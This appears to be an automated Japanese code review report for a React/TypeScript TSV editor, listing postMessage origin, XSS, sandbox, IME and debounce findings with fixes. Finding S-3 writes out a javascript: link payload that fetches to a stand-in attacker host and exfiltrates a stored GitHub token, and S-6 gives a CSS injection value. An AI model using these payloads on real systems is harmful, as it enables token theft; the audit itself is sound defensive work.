# コードレビューレポート 2026-07-25 — shunjapanes/main

## サマリー

- 実行日時: 2026-07-25 自動レビュー・3エージェント並列
- プロジェクト: TSV/CSVエディタ (React 19 + TypeScript + Vite + Tailwind)
- レビューファイル数: 8件 (App.tsx, bridge.ts, RibbonToolbar.tsx, SearchBar.tsx, FileTabBar.tsx, RibbonButton.tsx, sw.js, editor.html)
- 発見件数: 🔴 Critical 0 / 🟠 High 6 / 🟡 Medium 20 / 🟢 Low 33 = 計59件
- うち新規 [NEW]: **8件** / 継続 [継続]: **51件** / 解消 [FIXED]: **0件**
- 適用済み自動修正: **0件**（src配下に console.log / console.error / debugger 文なし）

### 今回の主な変化
| 変化 | 内容 |
|------|------|
| 🆕 S-25 [NEW] | editor.html の window.parent.postMessage が全て `'*'` — S-2 と対称的な漏洩リスク |
| 🆕 S-26 [NEW] | renderHtmlValue の auto-link が `target="_blank"` + `rel` なし → タブナッピング |
| 🆕 B-15 [NEW] | SearchPrev/Next ボタンがデバウンスをフラッシュせずに送信 — 古いクエリでナビ |
| 🆕 B-16 [NEW] | Escape キーがデバウンスタイマーをキャンセルせずに clearSearch を送信 |
| 🆕 B-17 [NEW] | Enter キーが IME コンポジション中にも searchNext を発火 (B-12 の onKeyDown 版) |
| 🆕 B-18 [NEW] | 置換ボタンがデバウンスをフラッシュせずに search + replace を連続送信 |
| 🆕 Q-N-16 [NEW] | 置換「1件」「全て」ボタンに title / aria-label なし |
| 🆕 Q-N-17 [NEW] | onOpenFile フォールバック `send('open')` がデッドコード |
| ℹ️ コード変更なし | 2026-07-24 以降、src/ への新規コミットなし |

---

## セキュリティ所見

### 🔴 Critical

**（なし）**

---

### 🟠 High

**[継続] S-2: postMessage targetOrigin が `'*'`（bridge.ts 親→子）**
- 場所: `client/src/lib/bridge.ts:3`
- `postMessage({ action, payload }, '*')` — ファイル内容・PAT・UI状態が任意オリジンに傍受される。
- **修正案:** `postMessage(msg, window.location.origin)`

**[継続] S-3: `<a href>` の URL に `javascript:` スキームを検証しない（XSS）**
- 場所: `client/public/editor.html` — `renderHtmlValue` の isHtml セル処理
- `escHtml()` は HTML 実体を変換するが `javascript:` は通過し `innerHTML` に注入される。
- ⚠️ **攻撃チェーン:** S-3 + sessionStorage PAT → 細工した TSV の isHtml セルに `<a href="javascript:fetch('https://attacker.invalid/?p='+sessionStorage.getItem('tsv-editor-debug-memo-pat'))">x</a>` を仕込むとクリック1回で PAT 漏洩。
- **修正案:** `if (!/^https?:\/\//i.test(url)) return escHtml(text)` を追加、`rel="noopener noreferrer"` 付与。

**[継続] S-4: FileReader.readAsText() エンコーディング引数未指定**
- 場所: `client/src/App.tsx:113`
- Shift-JIS/EUC-JP ファイルで文字化け・データ破損リスク。
- **修正案:** ArrayBuffer + TextDecoder + BOM 検出でエンコーディング自動判定。

**[継続] S-5: デバッグ機能 (debugMemo) が本番 UI に露出 — DEV ガードなし**
- 場所: `client/src/components/RibbonToolbar.tsx:196–198`
- `import.meta.env.DEV` ガードなしに常時表示。PAT ダイアログに本番から到達可能。
- **修正案:** `{import.meta.env.DEV && <RibbonGroup label="デバッグ">...</RibbonGroup>}`

**[継続] S-7: iframe に sandbox 属性なし → フルオリジン信頼**
- 場所: `client/src/App.tsx:141–147`
- sandbox 未指定のため iframe 内 XSS → 親フレームへのリダイレクト・任意ポップアップが可能。S-11・S-16 も同時解決。
- **修正案:** `sandbox="allow-scripts allow-same-origin allow-downloads allow-popups allow-clipboard-read allow-clipboard-write"` を追加（`allow-top-navigation` は除外）。

**[継続] B-13: Ctrl+Z/Y が検索 INPUT 欄フォーカス中も editor.html に送信される**
- 場所: `client/src/App.tsx:65` — `if (tag === 'IFRAME') return` のみ（INPUT/TEXTAREA ガードなし）
- 検索バーで Ctrl+Z を押すと入力テキストの undo ではなくエディタへ undo が転送される。
- **修正案:** `if (tag === 'INPUT' || tag === 'TEXTAREA') return;` を追加。

---

### 🟡 Medium

**[NEW] S-25: editor.html の window.parent.postMessage が全て `'*'` — S-2 の対称漏洩**
- 場所: `client/public/editor.html` — editor→parent 方向の全 postMessage 呼び出し
- `tabs` メッセージにはファイルタブ名 (`{ name: t.fileName, dirty: ... }`) が含まれる。editor.html をクロスオリジン iframe として埋め込んだページがメッセージリスナーを持てばファイル名が漏洩する。
- **修正案:** `window.parent.postMessage(msg, location.origin)` に統一。

**[継続] S-6: `<font color>` 値を介した CSS プロパティインジェクション**
- 場所: `client/public/editor.html` — isHtml セル `renderHtmlValue`
- `escHtml()` は `;` を変換しないため `<font color="red;background:url(https://attacker.example/)">` が通過する。
- **修正案:** `/^(#[0-9a-fA-F]{3,8}|[a-zA-Z]{2,30})$/.test(color)` で検証。

**[継続] S-8: App.tsx の postMessage 受信側で `e.origin` を未検証**
- 場所: `client/src/App.tsx:77`
- **修正案:** `if (e.origin !== window.location.origin) return;` をハンドラ先頭に追加。

**[継続] S-9: 置換ボタンが search と replaceOne/All を連続 postMessage で競合**
- 場所: `client/src/components/SearchBar.tsx` — replace ボタン onClick
- **修正案:** `searchCount` 応答受信後に replace を発行するコールバック方式に変更。

**[継続] S-10: Content-Security-Policy (CSP) の欠如**
- 場所: `client/index.html` / `client/public/editor.html`
- **修正案:** `default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.github.com;` を設定。

**[継続] S-11: allow="popups" による iframe へのポップアップ権限付与**
- S-7 の sandbox 追加で同時解決。

**[継続] S-12: editor.html の postMessage ハンドラが `e.origin` を未確認**
- 場所: `client/public/editor.html`
- **修正案:** `if (e.source !== window.parent || e.origin !== location.origin) return;`

**[継続] S-13: Service Worker がキャッシュファーストのためセキュリティパッチを配信不可**
- 場所: `client/public/sw.js`
- **修正案:** stale-while-revalidate 戦略に変更。

**[継続] S-16: clipboard-read / clipboard-write 権限が sandbox なし iframe に付与**
- S-7 の sandbox 追加で対処。

**[継続] B-2: searchNext/searchPrev を setTimeout(30ms) で呼び出す競合リスク**
- 場所: `client/src/components/SearchBar.tsx:61`
- **修正案:** `searchCount` 受信後に next/prev を送るコールバック方式に変更。

**[継続] B-3: FileReader.result を型確認なしに string キャスト**
- 場所: `client/src/App.tsx:110` — `ev.target?.result as string`
- **修正案:** `if (typeof result === 'string') { ... }` ガードを追加。

**[継続] B-6: SearchBar — externalQuery 同期 useEffect の古い state 参照**
- 場所: `client/src/components/SearchBar.tsx:20-25`
- **修正案:** 完全制御コンポーネントに変更（Q-5 と同時対応）。

**[継続] B-7: doGotoRow が行番号を文字列のまま送信**
- 場所: `client/src/components/SearchBar.tsx:41`
- **修正案:** `send('gotoRow', Number(rowNum))`

**[継続] B-8: FileReader に onerror ハンドラなし**
- 場所: `client/src/App.tsx`
- **修正案:** `reader.onerror = () => setStatus('ファイル読み込みエラー')` を追加。

**[継続] B-10: clearSearch 送信前にデバウンスタイマーがキャンセルされない（X ボタン）**
- 場所: `client/src/components/SearchBar.tsx:69`
- **修正案:** `clearTimeout(debounceRef.current)` を `send('clearSearch')` 前に追加。

**[NEW] B-16: Escape キーがデバウンスタイマーをキャンセルしない**
- 場所: `client/src/components/SearchBar.tsx:63`
- Enter ハンドラは `clearTimeout(debounceRef.current)` を明示的に呼ぶが、Escape ハンドラは呼ばない。Escape 押下直後に (1) 旧クエリのデバウンスが発火、(2) `handleQueryChange('')` の新デバウンスが発火 の2つが clearSearch の後に届き、再検索が起動する可能性がある。
- **修正案:** Escape 分岐の先頭に `if (debounceRef.current) clearTimeout(debounceRef.current)` を追加。

**[継続] B-12: SearchBar で IME コンポジション中に検索が発火（日本語入力が壊れる）**
- 場所: `client/src/components/SearchBar.tsx:54` — onChange
- **修正案:**
  ```typescript
  onChange={e => { if (e.nativeEvent.isComposing) return; handleQueryChange(e.target.value) }}
  onCompositionEnd={e => handleQueryChange((e.target as HTMLInputElement).value)}
  ```

**[NEW] B-17: Enter キーが IME コンポジション中に searchNext を発火**
- 場所: `client/src/components/SearchBar.tsx:57` — onKeyDown
- `if (e.key === 'Enter')` 分岐に `e.nativeEvent.isComposing` ガードがない。日本語 IME で Enter を押して変換候補を確定すると、search + setTimeout(searchNext, 30) が誤送信される（B-12 は onChange の問題、これは onKeyDown の独立した問題）。
- **修正案:** `if (e.key === 'Enter' && !e.nativeEvent.isComposing) { ... }`

**[継続] Q-2: focusEditor() が空の catch でエラーを握り潰す**
- **修正案:** `catch (e) { /* cross-origin restriction — intentional */ }` でコメント明示。

**[継続] Q-3: message ハンドラの型判別に switch が使われていない**
- **修正案:** `switch (msg.type) { ... }` に変更。

---

### 🟢 Low

**[NEW] S-26: `target="_blank"` に `rel="noopener noreferrer"` がない（タブナッピング）**
- 場所: `client/public/editor.html` — `renderHtmlValue` の auto-link および `<a href>` 再構築
- 開かれたページが `window.opener.location` を設定でき、フィッシングページにリダイレクト可能。
- **修正案:** auto-link 生成部分に `rel="noopener noreferrer"` を追加。

**[継続] S-14: sw.js のフェッチ失敗時に undefined を返しエラーをマスク**
- **修正案:** `.catch(() => cached ?? new Response('Offline', { status: 503 }))`

**[継続] S-15: FileReader でファイルサイズ上限チェックなし**
- **修正案:** `if (file.size > 100 * 1024 * 1024) { setStatus('ファイルが大きすぎます (上限100MB)'); return; }`

**[継続] S-18: @babel/core 7.x — GHSA-4x5r-pxfx-6jf8**
- **修正案:** `cd client && npm audit fix`

**[継続] S-20: SW activate ハンドラが旧バージョンキャッシュを削除しない**
- **修正案:** `caches.keys().then(ks => Promise.all(ks.filter(k => k !== CACHE).map(k => caches.delete(k))))` を追加。

**[継続] S-21: サニタイズされていない file.name が postMessage 経由で editor.html に転送される**
- **修正案:** `file.name.replace(/[<>&"']/g, '_')` でサニタイズ。

**[継続] S-22: SW が GitHub API の GET レスポンスを無制限にキャッシュ**
- **修正案:** `if (!e.request.url.startsWith(self.location.origin)) { e.respondWith(fetch(e.request)); return; }`

**[継続] S-23: replaceText が未サニタイズのまま postMessage で editor.html に転送される**
- **修正案:** S-21 と同じサニタイズ処理を replaceText にも適用。

**[継続] S-24: editor.html の regex モードで `new RegExp(q)` が無制限実行 → ReDoS**
- **修正案:** 入力長上限（例: 200文字）を設ける、または Worker + `terminate()` でタイムアウト制御。

**[継続] B-4: FileTabBar タブ本体が `<div>` でキーボード操作不可**
- **修正案:** `<button type="button">` に変更。

**[継続] B-11: FileTabBar key={i} — タブ削除時に React 差分アルゴリズムが誤認**
- **修正案:** `key={tab.name}` またはユニーク ID を使用。

**[継続] B-14: マウント直後に空検索クエリが editor.html に送信される**
- **修正案:** debounce 内で `if (!query) return;` を先頭に追加。

**[NEW] B-15: SearchPrev/Next ボタンがデバウンスをフラッシュせずにナビゲートを送信**
- 場所: `client/src/components/SearchBar.tsx:75-80`
- ChevronUp/ChevronDown ボタンのクリックハンドラが `clearTimeout(debounceRef.current)` を呼ばない。タイプ直後にボタンをクリックすると、旧クエリでの180ms デバウンスが後から到着し検索位置がずれる（Enter キーパスは正しく処理済み）。
- **修正案:** ボタン onClick の先頭に `if (debounceRef.current) clearTimeout(debounceRef.current); send('search', query);` を追加。

**[NEW] B-18: 置換ボタンがデバウンスタイマーをキャンセルせずに置換を送信**
- 場所: `client/src/components/SearchBar.tsx:103-107`
- 「1件」「全て」ボタンが `send('search', query)` を直接呼ぶが `clearTimeout` を先に呼ばない。入力中に置換ボタンを押すと、180ms後にデバウンスが search を再送してハイライト位置がリセットされる。
- **修正案:** ボタン onClick の先頭に `if (debounceRef.current) clearTimeout(debounceRef.current)` を追加。

**[継続] Q-5: SearchBar の useEffect に eslint-disable コメント（二重状態管理）**
- **修正案:** `query` state を App.tsx に一元化。

**[NEW] Q-N-16: 置換「1件」「全て」ボタンに title / aria-label なし**
- 場所: `client/src/components/SearchBar.tsx:103-107`
- 隣接する検索ナビゲーションボタンは全て `title` を持つが、これらの置換コミットボタンは持たない。スクリーンリーダーが目的を読み上げられない。
- **修正案:** `<button ... title="1件置換" aria-label="1件置換">` に変更。

**[NEW] Q-N-17: onOpenFile フォールバック `send('open')` がデッドコード**
- 場所: `client/src/components/RibbonToolbar.tsx:68`
- `onClick={() => onOpenFile ? onOpenFile() : send('open')}` — App.tsx は常に `onOpenFile` を渡すため `send('open')` に到達しない。
- **修正案:** `onClick={() => onOpenFile?.()}` に簡略化、またはプロップを required にする。

**[継続] Q-N-1: handleKeyDown 内で早期 return 後も `cmd &&` を再チェック（冗長）**

**[継続] Q-N-2: FileTabBar タブ本体が `<div>` で実装されキーボード操作不可**

**[継続] Q-N-3: FileTabBar 閉じる・追加ボタンに aria-label がない**

**[継続] Q-N-4: RibbonButton の `size='large'` オプションがデッドコード**

**[継続] Q-N-5: SearchBar の Enter キー後に setTimeout の魔法の数値 30ms**

**[継続] Q-N-6: FileTabBar と StatusBar でインラインスタイルに魔法の数値**

**[継続] Q-N-7: RibbonButton の onClick に冗長な disabled ガードが存在**

**[継続] Q-N-8: FileReader onload で緩やかな等値演算子 `!= null` を使用**

**[継続] Q-N-9: `type Tab` の命名衝突（RibbonToolbar と App/FileTabBar で同名の異なる型）**

**[継続] Q-N-10: ToggleStates 型を子コンポーネント RibbonToolbar が親 App.tsx からインポート**

**[継続] Q-N-11: debounce 遅延 180ms が未ドキュメントの魔法の数値**

**[継続] Q-N-12: doGotoRow() 実行後に rowNum state がクリアされない**

**[継続] Q-N-13: EditorMessage が全フィールド任意の平坦インターフェース（判別共用体ではない）**

**[継続] Q-N-15: SearchBar の X（クリア）ボタンに aria-label も title もなし**

---

## 適用済み自動修正

```diff
(なし — src配下に console.log / console.error / debugger 文なし)
```

---

## 推奨アクション（優先度順）

1. **[即対応・1行] B-13 (High):** `handleKeyDown` に `if (tag === 'INPUT' || tag === 'TEXTAREA') return;` を追加。検索欄 Ctrl+Z 問題を修正。
2. **[即対応・1行] S-5 (High):** RibbonToolbar の ToolsTab デバッググループを `{import.meta.env.DEV && ...}` でガード。
3. **[即対応・2行] B-16 (Medium) [NEW]:** Escape ハンドラ先頭に `clearTimeout(debounceRef.current)` を追加。
4. **[即対応・1行] B-17 (Medium) [NEW]:** `if (e.key === 'Enter')` に `&& !e.nativeEvent.isComposing` を追加。日本語 IME の Enter 誤発火を修正。
5. **[今週] S-7 (High):** iframe に `sandbox="allow-scripts allow-same-origin allow-downloads allow-popups allow-clipboard-read allow-clipboard-write"` 追加。S-11・S-16 も同時解決。
6. **[今週] S-3 (High):** isHtml セルの URL を `https?://` ホワイトリストで検証。PAT漏洩攻撃チェーンを遮断。
7. **[今週] S-25 (Medium) [NEW]:** editor.html の `window.parent.postMessage` の targetOrigin を `location.origin` に変更。
8. **[今週・1行] S-8 (Medium):** `App.tsx` メッセージハンドラ先頭に `if (e.origin !== window.location.origin) return;` を追加。
9. **[今週] B-12 (Medium):** SearchBar onChange に `isComposing` チェック追加。
10. **[今週] B-15 (Low) [NEW]:** SearchPrev/Next ボタンに debounce フラッシュを追加。
11. **[今週] B-18 (Low) [NEW]:** 置換ボタンに debounce フラッシュを追加。
12. **[今週] B-8 (Medium):** FileReader に `reader.onerror` ハンドラを追加。
13. **[今週] S-2 (High):** `bridge.ts` の `postMessage` targetOrigin を `window.location.origin` に変更。
14. **[来週・1コマンド] S-18 (Low):** `cd client && npm audit fix` で @babel/core 更新。
15. **[来週] S-24 (Low):** regex モードに入力長上限を追加して ReDoS を緩和。
16. **[来週] S-26 (Low) [NEW]:** renderHtmlValue の auto-link に `rel="noopener noreferrer"` を追加。
17. **[来週] B-7 (Medium):** `doGotoRow` で `Number(rowNum)` を送信。
18. **[来週] Q-N-16 (Low) [NEW]:** 置換ボタンに `title` / `aria-label` を追加。
19. **[来週] Q-N-17 (Low) [NEW]:** `onOpenFile` フォールバックを `onOpenFile?.()` に簡略化。
20. **[来週] S-12 (Medium):** `editor.html` メッセージハンドラに `e.origin` チェックを追加。
21. **[来週] S-22 (Low):** SW fetch ハンドラでクロスオリジンリクエストをキャッシュスキップ。

> 詳細な過去経緯は `_review/2026-07-24_code_review.md` を参照
